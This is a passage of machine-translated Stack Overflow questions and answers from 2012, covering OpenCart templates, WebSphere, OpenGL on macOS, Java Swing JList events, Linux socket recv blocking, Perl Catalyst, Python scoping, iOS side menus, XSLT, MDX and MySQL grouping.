                                '<td class="right"><?php echo $product[\'price\']; ?></td>'+
                                '<td class="right"><?php echo $product[\'total\']; ?></td>'+
                              '</tr>'+
                            '</tbody>'+
                            '<?php } ?>'+
                            '<tbody id="totals">'+
                            '<tr>'+
                                '<td colspan="4" class="right"><?php echo $text_subtotal; ?> :</td>'+
                                '<td class="right">' + data['subtotal'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_weight'] + ') { ?>'+
                            '<tr>'+
                                '<td colspan="4" class="right">' + data['shipping_weight'] + ' :</td>'+
                                '<td class="right">' + data['shipping_cost'] + '</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                            '<tr>'+
                                '<td colspan="4" class="right"><?php echo $text_total; ?> :</td>'+
                                '<td class="right">' + data['totals'] + '</td>'+
                            '</tr>'+
                            '</tbody>'+
                          '</table>'+
                          '<?php if (' +data['downloads'] + ') { ?>'+
                          '<h3><?php echo $text_download; ?></h3>'+
                          '<table class="list">'+
                            '<thead>'+
                              '<tr>'+
                                '<td class="left"><b><?php echo $column_download; ?></b></td>'+
                                '<td class="left"><b><?php echo $column_filename; ?></b></td>'+
                                '<td class="right"><b><?php echo $column_remaining; ?></b></td>'+
                              '</tr>'+
                            '</thead>'+
                            '<tbody>'+
                              '<?php foreach (' + data['downloads'] + ' as $download) { ?>'+
                              '<tr>'+
                                '<td class="left"><?php echo $download[\'name\']; ?></td>'+
                                '<td class="left"><?php echo $download[\'filename\']; ?></td>'+
                                '<td class="right"><?php echo $download[\'remaining\']; ?></td>'+
                              '</tr>'+
                              '<?php } ?>'+
                            '</tbody>'+
                          '</table>'+
                          '<?php } ?>'+
                        '</div>'+
                            '<?php } ?>'+
                            '<?php if ($this->config->get(\'sales_order_history\')) { ?>'+
                        '<div id="tab-history" class="vtabs-content">'+
                          '<div id="history"></div>'+
                          '<table class="form">'+
                            ' <?php if ($this->config->get(\'sales_order_history_update\')) { ?>' +
                            '<tr>'+
                              '<td><?php echo $entry_order_status; ?></td>'+
                              '<td><select name="order_status_id">'+
                                  '<?php foreach (' + data['order_statuses'] + '  as $order_statuses) { ?>' +
                                  '<?php if ($order_statuses[\'order_status_id\'] == $order_status_id) { ?>' +
                                  '<option value="<?php echo $order_statuses[\'order_status_id\']; ?>" selected="selected"><?php echo $order_statuses[\'name\']; ?></option>'+
                                  '<?php } else { ?>' +
                                  '<option value="<?php echo $order_statuses[\'order_status_id\']; ?>"><?php echo $order_statuses[\'name\']; ?></option>' +
                                  '<?php } ?>'+
                                  '<?php } ?>'+
                                '</select></td>'+
                            '</tr>'+
                                '<tr>'+
                              '<td><?php echo $entry_notify; ?></td>'+
                              '<td><input type="checkbox" name="notify" value="1" /></td>'+
                            '</tr>'+
                            '<tr>'+
                              '<td><?php echo $entry_comment; ?></td>'+
                              '<td><textarea name="comment" cols="40" rows="8" style="width: 99%"></textarea>'+
                                '<div style="margin-top: 10px; text-align: right;"><a onclick="history();" id="button-history" class="button"><?php echo $button_add_history; ?></a></div></td>'+
                            '</tr>'+
                            '<?php } ?>' +
                        '</table>' +
                        '</div>' +
                        '<?php } ?>'; //Getting Error on this line on Netbeans IDE

                      $('div.latest_detail div#oder_detail').html(html);
                }
                else
                {
                    $('#order_detail').html('Sorry No Details exists for this order in the database');
                }
            }, 'json'); 
```

我正在修改开放式购物车。对不起，如果我做错了。我厌倦了寻找错误但无法解决它。在浏览器上运行此程序后出现的错误是

```
Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, 
expecting T_STRING in 
C:\Server\Zend\Apache2\htdocs\oc\admin\view\template\common\home.tpl on line 522 
```

在 Netbeans IDE 上，它向我显示了之前 html 最后一行左侧无效分配的建议

```
$('div.latest_detail div#oder_detail').html(html); 
```

请帮忙。？？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:45:04.880

正如其他人指出的那样，您最大的问题是您试图`if-then`在 JavaScript 代码中使用 PHP 逻辑。这是行不通的，因为 PHP 在服务器端运行而 JavaScript 在客户端运行，所以它们不可能相互交互。

但是，即使没有这个，用 JavaScript 编写冗长的 HTML 代码块也很麻烦且没有必要。更好的方法是在 HTML 中编写该代码并使用 CSS with 将其隐藏，然后根据需要`display:none`使用 jQuery 。`show()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:51:29.373

您的问题在这里：

```
'<td><?php if (' + data['invoice_no'] + '){ ?>' + 
```

这将变成：

```
<?php if (123435-ABC) { ?> 
```

# java - 带有 WAS 7 的 java.util.zip.ZipFile.ensureOpenOrZipException

> ID：12461623
> 
> 赞同：0
> 
> 时间：2012-09-17T14:38:30.100
> 
> 标签：java, web-services, websphere-7

问题与此处描述的完全相同：

[WAS 7 的异常 java.util.zip.ZipFile.ensureOpenOrZipException](https://stackoverflow.com/questions/12400802/exception-java-util-zip-zipfile-ensureopenorzipexception-with-was-7)

解决后，我将应用程序模块更改为 2.4 并解决了问题。我没有改变决议中提到的wsdl的路径。但是一旦更改了应用程序模块，就不会生成 webservices.xml 文件。我需要生成 xml 文件。

在我不需要更改应用程序模块的情况下，有人对此问题有任何替代解决方案吗？

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-19T17:41:33.000

您所指的原始问题有两个部分。一是关于`ZIPException`. 由于该异常是在 WebSphere 代码的深层触发的，因此您不太可能在此处获得该问题的解决方案。您应该为此联系 IBM 支持。另一部分是关于内存问题。根据我使用部署在 WebSphere 上的 JAX-WS 服务（以及一般使用 WebSphere）的经验，我可以提出两个建议：

1.  最初的问题说问题发生在“几次部署之后”。这指向类加载器泄漏。类加载器泄漏是一种特殊类型的内存泄漏，可防止应用程序的旧类加载器在重新部署或重新启动应用程序后被垃圾收集（有关更详细的描述，请参见[此处](http://code.google.com/p/arit/wiki/GettingStarted)）。这可能是由应用程序或服务器运行时引起的。经验表明，WebSphere 本身有几个问题会导致此类泄漏，而 IBM 通常在解决这些问题方面效率不高。我曾经编制了一份我遇到的此类已知 WebSphere 问题的列表。它[在这里发布](http://code.google.com/p/arit/wiki/KnownClassLoaderLeaks#WebSphere). 可以看出，基本上任何或多或少复杂的 Java EE 应用程序都会受到这类问题的影响。因此，您应该做好准备，当频繁重新部署而不重新启动服务器时，它最终会耗尽内存。

    注意：为 IBM 辩护，应该说其他应用服务器不一定在这方面表现更好。

2.  在一种特殊情况下，部署在 WebSphere 上的 JAX-WS 服务可能会消耗出乎意料的大量内存。这发生在使用自顶向下方法（即从 WSDL 开始）开发的服务，但`@WebService`不引用原始 WSDL 的注释。在这种情况下，WebSphere（完全正确）认为它们是自下而上的服务，并基于 JAX-WS/JAXB2 注释生成 WSDL 和 XML Schema 文档。这些文档保存在内存中，并且在某些情况下（尤其是对于复杂服务）可能比原始的 WSDL 和 XML Schema 文档大得多。我曾经见过一个为此消耗 200MB 堆的应用程序。为避免这种情况，请确保在创建自上而下的 JAX-WS 服务时，将原始 WSDL 和 XML Schema 文档打包到应用程序中，并且服务实现具有`@WebService`正确引用这些文档的注释。

# objective-c - Xcode with OpenGL：新窗口不会自动成为活动上下文

> ID：12461625
> 
> 赞同：1
> 
> 时间：2012-09-17T14:38:36.917
> 
> 标签：objective-c, xcode, opengl, document-based

当我使用 NSOpenGLView 创建基于文档的 Xcode 项目时，我遇到了一个奇怪的问题。该应用程序适用于单个文档，响应鼠标点击。当您选择文件/新建打开第二个文档时，顶部会出现一个新的前窗口，但鼠标单击会发送到前一个（背景）对象。您可以移动新窗口，点击仍会发送到前一个对象。但是，如果您调整新窗口的大小或在前一个窗口中来回单击，则一切正常。所以问题似乎是新的（前）窗口没有成为活动上下文。你能提出一个解决方案吗？我已将 Xcode 4.4 代码 (44kb) 放在[http://www.mccauslandcenter.sc.edu/CRNL/sw/GLdoc.zip](http://www.mccauslandcenter.sc.edu/CRNL/sw/GLdoc.zip)。

1.  创建一个新的基于文档的应用程序
2.  将 MyOpenGLView.m 和 MyOpenGLView.h 文件添加到项目中
3.  对于 Targets/BuildPhases，将 OpenGL.framework 添加到“Link Binary With Libraries”
4.  对于 Targets/BuildPhases，将 MyOpenGLView.m 添加到“Compile Sources”
5.  在界面生成器中 a.) 选择 Document's Window 并在属性检查器中关闭“One shot” b.) 从对象库中添加一个 OpenGL 视图 c.) 使用身份检查器，将新创建的 NSOpenGLView 的类设置为 MyOpenGLView
6.  运行项目

----开始我的OpenGLView.h

```
#import <Cocoa/Cocoa.h>
#import <GLUT/GLUT.h>

@interface MyOpenGLView : NSOpenGLView
{
    NSTimer* timer; //animation timer
    NSPoint mouseloc;
    NSPoint screenSize;
    int hourglassSize;
    BOOL updateGL;
}

@end 
```

----START MyOpenGLView.m

```
// document based OpenGL application inspired by http://www.alecjacobson.com/weblog/?p=2110
#import "MyOpenGLView.h"

@implementation MyOpenGLView

-(void)prepareOpenGL
{
    //NSLog(@"preparing");
}

- (void)reshape
{
    //NSLog(@"reshaping");
    NSRect rectView = [self bounds];
    screenSize.x = rectView.size.width;
    screenSize.y = rectView.size.height;
}

void enter2D (int width, int height) //Enter2D = reshapeGL
{
    glDisable(GL_DEPTH_TEST);
    glViewport(0, 0, width, height);
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    glOrtho(0, width, 0, height,-1,1); //map view to match pixel size, e.g. gluOrtho2D(0, width, 0, height);
    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();
    glEnable (GL_BLEND); //allow transparent objects
    glBlendFunc (GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
}

void drawTriangle (int sz, int left, int bottom)
{
    glLoadIdentity ();
    glTranslatef(left,bottom,0.0f);
    glBegin(GL_TRIANGLES);
    glVertex3f( sz/2, sz, 0.0f);// Top
    glVertex3f(0.0,0.0, 0.0); // Bottom Left
    glVertex3f( sz,0.0f, 0.0f);  // Bottom Right
    glEnd(); // Finished Drawing The Triangle
}

void drawHourGlass (int sz, NSPoint center)
{
    glLoadIdentity ();
    glTranslatef(center.x,center.y,0.0f);
    glBegin(GL_TRIANGLES); //lower triangle
    glVertex3f( 0.0, 0.0, 0.0f); // Top
    glVertex3f(-sz,-sz, 0.0);// Bottom Left
    glVertex3f( sz,-sz, 0.0f);// Bottom Right
    glEnd(); 
    glBegin(GL_TRIANGLES); //upper triangle
    glVertex3f( 0.0, 0.0, 0.0f); // bottom
    glVertex3f(-sz,sz, 0.0);// Top Left
    glVertex3f( sz,sz, 0.0f);// Top Right
    glEnd();
}

-(void)drawRect:(NSRect)rect
{
    updateGL = FALSE;
    //NSLog(@" %f %f",rect.size.width,rect.size.height);
    enter2D(screenSize.x,screenSize.y);
    glClearColor(0.8,0.9,1,1); //background - blue sky
    glClear(GL_COLOR_BUFFER_BIT);
    glColor4f(0.6,0.3,0.1,1.0); //mountains - brown opaque
    drawTriangle(100,10,0);
    drawTriangle(70,80,0);
    glColor4f(0.1,0.1,0.1,0.7); //crosshair - gray, slightly translucent
    drawHourGlass (hourglassSize, mouseloc);
    glFlush();     // Flush all OpenGL calls
}

- (void)mouseDown:(NSEvent *)event
{
    mouseloc = [self convertPoint:[event locationInWindow] fromView:nil];
    updateGL = TRUE;
}

int constrain (int size)
{
    if (size < 5)
        return 5;
    else if (size > 50)
        return 50;
    else
        return size;
}

- (void) magnifyWithEvent:(NSEvent *)event;
{
    if ([event magnification] > 0)
        hourglassSize = hourglassSize + 5;
    else
        hourglassSize = hourglassSize - 5;
    hourglassSize = constrain(hourglassSize);
    updateGL = TRUE;
}

- (void)scrollWheel:(NSEvent *)event
{
    if (event.deltaY < 0)
       hourglassSize = hourglassSize + 5;
    if (event.deltaY > 0)
        hourglassSize = hourglassSize - 5;
    hourglassSize = constrain(hourglassSize);
    updateGL = TRUE;
}

- (void)animationTimer:(NSTimer *)timer
{
    if (updateGL == TRUE)
        [self drawRect:[self bounds]];
}

-(BOOL)acceptsFirstResponder { return YES; }
-(BOOL)becomeFirstResponder { return YES; }
-(BOOL)resignFirstResponder { return YES; }

- (void) awakeFromNib
{
    // [[self window] setAcceptsMouseMovedEvents:YES];
    mouseloc.x = 30;
    mouseloc.y = 40;
    hourglassSize = 30;
    timer = [NSTimer timerWithTimeInterval:(1.0f/60.0f) target:self selector:@selector(animationTimer:) userInfo:nil repeats:YES];
    [[NSRunLoop currentRunLoop] addTimer:timer forMode:NSDefaultRunLoopMode];
    // ensure timer fires during resize
    [[NSRunLoop currentRunLoop] addTimer:timer forMode:NSEventTrackingRunLoopMode];
    updateGL = TRUE;
}

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:23:09.010

对于遇到此问题的其他人（在 Apple 分发的一些较旧的演示中存在），对于现代版本的 OSX（10.4 及更高版本），您使用 CVDisplayLink 而不是计时器来更新 OpenGL 视图。

[http://developer.apple.com/library/mac/#qa/qa1385/_index.html](http://developer.apple.com/library/mac/#qa/qa1385/_index.html)

亚历克雅各布森在这里概述了这个解决方案 [http://www.alecjacobson.com/weblog/?p=2185](http://www.alecjacobson.com/weblog/?p=2185)

# java - 当通过鼠标更改值时，JList 会触发 valueChanged 两次

> ID：12461627
> 
> 赞同：26
> 
> 时间：2012-09-17T14:38:44.703
> 
> 标签：java, swing, jlist, java-7, listselectionlistener

我最近在 java 中遇到了一个错误，其中 JList 会在使用鼠标更改值时触发 valueChanged() 方法两次，而在使用键盘更改值时只会触发一次。我刚刚在 Oracle 的网站上发现[了一个](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4323107)关于此的错误（显然，该错误已有***十二年以上的历史***了），我想知道是否有人可以向我解释为什么 Oracle 认为这不是缺陷（更不用说getValueIsAdjusting() 在使用键盘时返回 false）。

对于遇到此问题的任何人，我发现只需检查何时`getValueIsAdjusting()`为假，然后运行我的其余方法即可解决此问题。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-09-17T14:53:58.587

有一个简单的解释。
当您使用鼠标应用选择时，您会执行一系列操作：

**1\. 在某个元素上按下鼠标左键**
- 列表选择鼠标下的一个元素并触发第一个事件
- 同样在这里你会得到 getValueIsAdjusting=true 因为鼠标尚未释放

**2\. 您可以拖动鼠标而不释放它来更改选择**
- list 将为所做的每个选择更改触发一个附加事件
- getValueIsAdjusting 对于每个事件也将是 true，因为您仍在进行更改

**3\. 你松开鼠标**
- 列表将触发最终事件 - 选择操作完成
- 现在 getValueIsAdjusting=false，你可以对最终选择做任何你想做的事情

总而言之 - 触发这些附加事件以让您完全控制选择更改的列表行为（准确地说是选择更改顺序）。您可能希望在 getValueIsAdjusting=true 时忽略选择更改，因为总会有一个带有 getValueIsAdjusting=false 的最终事件，它会通知您选择更改已完成。

此外，当您使用按键更改选择时，列表不会知道您是否要在第一次按键后更改它，因此 getValueIsAdjusting 对于此类更改将始终为 false。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2014-08-22T13:52:40.657

有一个简单的解决方案：

```
private void jList1 ValueChanged(javax.swing.event.ListSelectionEvent evt) { 

    if (!evt.getValueIsAdjusting()) {//This line prevents double events

    }

} 
```

# linux - Linux C 套接字：recv 调用被阻塞

> ID：12461628
> 
> 赞同：1
> 
> 时间：2012-09-17T14:38:53.263
> 
> 标签：linux, sockets, recv

在我的应用程序中，我为一个简单的 http 服务器创建了一个线程，然后在我的应用程序中，我尝试连接到 http 服务器，但控制在 recv 调用时被阻止/挂起。

但是如果尝试使用 linux GET 命令连接到我的应用程序的 http 服务器，我将成功连接到 http 服务器。

根据我通过搜索谷歌的理解，我发现这不是正确的方法。

但是如果我想这样做，我应该在什么中创建套接字，以便我可以从应用程序中连接我的 http 服务器。

**下面是我的 http 服务器套接字是如何创建的**

```
pthread_create(&pt_server, NULL, http_srvr, NULL);

//http server handler
void *http_server()
{
    int sockfd, new_fd;             
    struct sockaddr_in my_addr;     
    struct sockaddr_in their_addr;  
    socklen_t sin_size;
    struct sigaction sa;
    int yes=1;

    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
    {
    perror("socket");
    exit(1);
    }

    if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(int)) == -1)
    {
    perror("setsockopt");
    exit(1);
    }

    my_addr.sin_family = AF_INET;               // host byte order
    my_addr.sin_port = htons(HTTP_PORT);        // short, network byte order
    my_addr.sin_addr.s_addr = INADDR_ANY;       // automatically fill with my IP
    memset(&(my_addr.sin_zero), '\0', 8);       // zero the rest of the struct

    if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))== -1)
    {
    perror("bind");
    exit(1);
    }

    printf("Listening to sockets\n");
    if (listen(sockfd, BACKLOG) == -1)
    {
    perror("listen");
    exit(1);
    }

    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1)
    {
    perror("sigaction");
    exit(1);
    }

    printf("server: waiting for connections...\n");

    while(1) {  // main accept() loop
        sin_size = sizeof(struct sockaddr_in);
        if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr,&sin_size)) == -1)
        {
          perror("accept");
          continue;
        }
        printf("server: got connection from %s\n",inet_ntoa(their_addr.sin_addr));

        handle_connection(new_fd);
    }
} 
```

**以下是我如何对我的 http 服务器进行 http POST**

```
 /* create socket */
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    return ERRSOCK;
  setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, 0, 0);

  /* connect to server */
  if (connect(s, &server, sizeof(server)) < 0) 
    ret=ERRCONN;
  else {
    if (pfd) *pfd=s;

    /* create header */
    if (proxy) {
      sprintf(header,
"%s http://%.128s:%d/%.256s HTTP/1.0\015\012User-Agent: %s\015\012%s\015\012",
          command,
          http_server1,
          http_port,
          url,
          http_user_agent,
          additional_header
          );
    } else {
      sprintf(header,
"%s /%.256s HTTP/1.0\015\012User-Agent: %s\015\012%s\015\012",
          command,
          url,
          http_user_agent,
          additional_header
          );
    }

    hlg=strlen(header);

    /* send header */   
    if (send(s,header,hlg,0)!=hlg)
      ret= ERRWRHD;

    /* send data */
    else if (length && data && (send(s,data,length,0)!=length) )
      ret= ERRWRDT;

    else {
      /* read result & check */
      ret=http_read_line(s,header,MAXBUF-1); 
```

**以下是http_read_line的内容，并且在这个函数recv调用被阻塞**

```
static int http_read_line (fd,buffer,max) 
     int fd; /* file descriptor to read from */
     char *buffer; /* placeholder for data */
     int max; /* max number of bytes to read */
{ /* not efficient on long lines (multiple unbuffered 1 char reads) */
  int n=0;
  while (n<max) {
    if (recv(fd,buffer,1,0)!=1) {
      n= -n;
      break;
    }
    n++;
    if (*buffer=='\015') continue; /* ignore CR */
    if (*buffer=='\012') break;    /* LF is the separator */
    buffer++;
  }
  *buffer=0;
  return n;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T22:13:34.580

您需要发送一个 HTTP 1.0 标头，或者阅读有关 HTTP 1.1 中的内容长度的信息。当服务器没有义务关闭连接时，您正在将流读取到 EOS，因此您阻塞。Content-Length 标头告诉您正文中有多少数据：您应该只尝试读取那么多字节。

如果您指定 HTTP 1.0（并且没有花哨的标头），服务器将在发送响应后关闭连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T17:30:54.750

您已经告诉“在我的应用程序中，我为一个简单的 http 服务器创建了一个线程，然后在我的应用程序中我尝试连接到 http 服务器，但控制在 recv 调用时被阻止/挂起。”

这意味着 recv 永远不会返回 0。现在 recv 函数何时返回 0？-> 当它得到一个 TCP FIN 段时。您的服务器似乎从未向客户端发送 TCP FIN 段。这里最有可能的原因是，您的客户端代码需要修改。您正在从客户端发送数据，但您从未发送过 FIN，因此我假设您的服务器功能将永远持续并且它没有发送 FIN。这使recv永远等待。

在当前代码中，也许解决方法是添加一行

```
else {
  /*Send the FIN segment, but we can still read the socket*/
  shutdown(s, SHUT_WR); 
  /* read result & check */
  ret=http_read_line(s,header,MAXBUF-1); 
```

在这种情况下，关闭函数发送 TCP FIN，服务器函数可以返回，然后它可能会正确关闭。

并且在适当的关闭时，来自服务器的 FIN 将被客户端接收。这将使 recv 返回 0，而不是永远被阻塞。

现在，如果您想继续从客户端传输任何进一步的数据，您需要再次连接，或者您可能需要一些不同的算法。

我希望我的解释可以帮助解决当前的问题。

# perl - 在同一系统/应用程序上使用两个版本的 Catalyst 进行测试

> ID：12461630
> 
> 赞同：1
> 
> 时间：2012-09-17T14:39:02.280
> 
> 标签：perl, catalyst

我正在尝试测试客户的 Catalyst 应用程序，该应用程序适用`Catalyst 5.8`于`Catalyst 5.9`.

我必须在他们的测试系统上执行此操作，其中应用程序 [也有一个复杂而混乱的安装] 正在运行`Catalyst 5.8`.

我想知道是否有一种干净的方式来回切换？

我在想，例如，在自定义目录中安装 5.9，去使用`Catalyst::Runtime '5.80';`或`use Catalyst::Runtime '5.90';`切换`@INC`以适应。

然而，由于一些更深层次的变化，我怀疑应用程序可能必须为 5.9 重新构建。

我真的不能对环境做很多深刻的改变，这不是我的系统，所以这是一个实现问题和一个编码问题，都混在一起了。

对此欢迎的任何评论，我不是一个深入的催化剂专家，所以我希望有一种简单的方法来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:23:58.713

使用[local::lib](http://search.cpan.org/~apeiron/local-lib-1.008004/lib/local/lib.pm)安装不同的 Catalyst 版本

# python - python全局变量，这是怎么回事？需要解释

> ID：12461631
> 
> 赞同：1
> 
> 时间：2012-09-17T14:39:05.110
> 
> 标签：python

有人可以解释这里发生了什么

```
x = 10
def foo():
    print "x in foo = ",x
    if x: x = 8    -------------> mysterious line

foo()
print "x in main = ",x 
```

在上面的代码中，如果我注释掉神秘的行（如果 x：x = 8）

我得到输出

```
x in foo =  10
x in main =  10 
```

否则我最终会出错

> “UnboundLocalError：分配前引用的局部变量‘x’”

为什么这样？

我知道`global x`只有当我需要在本地修改全局变量时才有用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:41:23.190

一旦你`x`对函数中的任何地方进行赋值，它就会成为一个局部变量，即使在赋值之前有对其值的引用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T14:41:54.633

在您的函数中，您分配给`x`没有`global`声明，`x`局部变量也是如此。但是，您尝试`x`在分配函数之前读取该函数，因此此时您有一个未绑定的本地。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T14:48:42.303

一开始可能看起来很奇怪的是，**本地名称是静态检测**的：如果在函数中的**任何地方**`x`分配了名称，Python 会假定该名称是函数中任何**地方**的本地名称。**`x`**

 ****换句话说，函数中的行顺序具有误导性：只要`x`在函数中的某处分配，第一行`x`就成为对局部变量的引用（在此代码点仍然未绑定）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:51:57.070

就像 Wooble 已经说过的，您需要在使用之前声明对全局变量的修改。

```
def foo():  
   global x  
   print "x in foo = ",x  
   if x: x = 8 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T14:54:11.700

`x = 8`函数中的任何位置没有`global x`使其成为局部变量。`print x`由于未初始化局部变量而失败****

# ios - Partially displayed UITableViewController like Facebook iphone app

> ID：12461633
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:11.973
> 
> 标签：ios, uitableview

I'm searching for the API which propose a tableView partially uncovered, like the one in Facebook app menu. I've seen it in several other apps.

I've heard the Facebook uses the Three20 lib, but this kind of control is not part of their catalog (http://three20.info/). Moreover, three20 seems to be a bit outdated.

If its Three20, which class is it? If no, does it come from an API?

Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:43:17.953

Facebook does not use Three20 anymore (besides, I strongly discourage its use since it is quite outdated and adds too much dependencies to a project)

Look at third party libraries, there are plenty to do this on Google.

For example, simply on CocoaControls.com you can find [this one](https://www.cocoacontrols.com/controls/pprevealsideviewcontroller) or [this one](https://www.cocoacontrols.com/controls/mfsidemenu) among others.

![PPRevealSideViewController capture](../Images/897b39c0dff028365abef6b439d2a95e.png) [![MFSideMenu sample](../Images/5c98b57d8a7917f37a5ec2add35c7a13.png)](https://i.stack.imgur.com/DxdCp.png)

# java - xslt内未关闭的html标签

> ID：12461640
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:32.510
> 
> 标签：java, html, xml, xslt

由于 xslt，我希望有未关闭的 html 标记。稍后我将在 xslt 中添加结束标记。我怎样才能做到这一点？这个不编译：

```
<xsl:when test="$href">
     <xsl:text><a href='{$href}'></xsl:text>
 </xsl:when> 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:57:21.697

这是您可能应该不惜一切代价避免的事情。我不知道您的要求，但您可能想要基于某些东西的链接或跨度标签。

在这些情况下，您可以使用类似这样的东西

```
<xsl:apply-templates select="tag"/> 
```

然后是2个模板，即

```
<xsl:template match="tag">
    <span>hello king dave</span>    
</xsl:template>

<xsl:template match="tag[@href]">
    <a href="{@href}">link text....</a>    
</xsl:template> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:15:36.277

如果没有更好地了解确切的用例，很难给出明确的答案，但值得注意的是，您可以`match` *在* `name`相同的`<xsl:template>`. 例如，如果您想为所有`<tag>`元素生成一些特定的输出，但在某些情况下还要将此输出包装在`<a>`标签中，那么您可以使用类似的习语

```
<xsl:template match="tag[@href]">
  <a href="{@href}"><xsl:call-template name="tagbody" /></a>
</xsl:template>

<xsl:template match="tag" name="tagbody">
  Tag content was "<xsl:value-of select="."/>"
</xsl:template> 
```

这里的想法是`tag`带有 an 的元素`href`将匹配第一个模板，该模板在调用通用模板之前和之后进行一些额外的处理`tag`。没有 an 的标签`href`只会命中没有包装逻辑的普通模板。即对于像这样的输入

```
<root>
  <tag>foo</tag>
  <tag href="#">bar</tag>
</root> 
```

你会得到像这样的输出

```
Tag content was "foo"
<a href="#">Tag content was "bar"</a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:56:20.253

在网上找到解决方案：

```
 <xsl:text disable-output-escaping="yes"><![CDATA[<a href=']]></xsl:text>
                 <xsl:value-of select="href"/>
        <xsl:text disable-output-escaping="yes"><![CDATA['>]]></xsl:text> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:44:59.763

我之前也遇到过同样的问题，只能通过复制`<a href='{$href}'>...</a>`每个`when`分支的全部来解决。

也许您可以尝试将`doctype`您的 XSL 设置为一些宽松的 XML 标准，但是 afaik XSLT 非常严格。

编辑：显然您可以使用`<xsl:output>`标签设置文档类型。

# mdx - MDX - 获取所选成员的最后 3 个成员

> ID：12461642
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:36.697
> 
> 标签：mdx, performancepoint

我对 MDX 很陌生，所以请多多包涵。

我正在设计一个分析图表，`PerformancePoint`其中`bottom(X)`轴将显示日期范围。显示的日期范围将取决于筛选器的选定值，该`date`筛选器基于`DATE`具有此层次结构的维度：`Year>Quarter>Month`。

假设用户`2010`从日期过滤器中进行选择。我们希望查询返回`2010`( `2007,2008,2009,2010`) 之前的最后 4 年。如果`Q1-10`选中，我们想要最后 4 个季度，包括`Q1-10`. 如果选择了一个月 ( `Sept 2010`)，我们需要最后 4 个月 ( `June 2010, July 2010, Aug 2010, Sept 2010`)。

我感谢任何形式的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:23:54.000

使用[LastPeriods](http://technet.microsoft.com/en-us/library/ms145588.aspx)函数：

```
LastPeriods(4, <<UniqueName>>) 
```

# mysql - 对类似项目进行分组

> ID：12461643
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:42.680
> 
> 标签：mysql, sql, group-by, grouping

这是我的数据表结构

```
    id actor_id created_at updated_at

    729 80 2012-09-10 17:05:59 2012-09-10 17:05:59
    731 80 2012-09-10 17:04:02 2012-09-10 17:04:02
    725 139 2012-09-06 13:59:08 2012-09-06 13:59:08
    724 76 2012-09-06 11:31:30 2012-09-06 11:31:30
    723 29 2012-09-06 09:40:22 2012-09-06 09:40:22
    719 29 2012-09-06 09:24:02 2012-09-06 09:24:02
    811 80 2012-09-02 17:05:59 2012-09-10 17:05:59
    812 80 2012-09-01 17:04:02 2012-09-10 17:04:02

```

这是结果

```
SELECT  `te`.`id`, te.actor_id, te.created_at, te.created_at
FROM `timeline_events` AS te
ORDER BY 
    te.created_at DESC
    LIMIT 10 
```

我需要按 actor_id 和 created_at 对其进行分组

这是我最终需要的

```
    id actor_id created_at updated_at 计数

    729 80 2012-09-10 17:05:59 2012-09-10 17:05:59 2
    725 139 2012-09-06 13:59:08 2012-09-06 13:59:08 1
    724 76 2012-09-06 11:31:30 2012-09-06 11:31:30 1
    723 29 2012-09-06 09:40:22 2012-09-06 09:40:22 2
    812 80 2012-09-10 17:04:02 2012-09-10 17:04:02 2

```

有人可以指导我如何做到这一点吗？

提前谢谢了

**UPD**为了简化，我将举另一个例子

所以说我有下一行

```
1 1（计数：2）
1
3 3（计数：1）
4
4 => 在魔术函数之后应该是 4（计数：2）
1
1 1（计数：3）
1
6 6（计数：2）
6
4 4（计数 3）
4
4

```

所以它应该按组划分。

**UPD 2** 我需要这个查询来渲染时间线。现在它显示了用户所做的所有信息，但我需要对其进行分组。

前

*   user1 上传照片
*   user1 更改信息
*   user2 更新了简历
*   user3上传的照片
*   user3 更新了简历
*   user1 更新简历

后

*   user1 上传了照片并更改了 infomarion
*   user2 更新了简历
*   user3 上传的照片和更新的简历
*   user1 更新了简历

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:55:42.327

我认为这可能是你想要做的：

```
select t1.id,
  t1.actor_id,
  max(created_at) created_at,
  updated_at,
  t2.total
from yourtable t1
left join
(
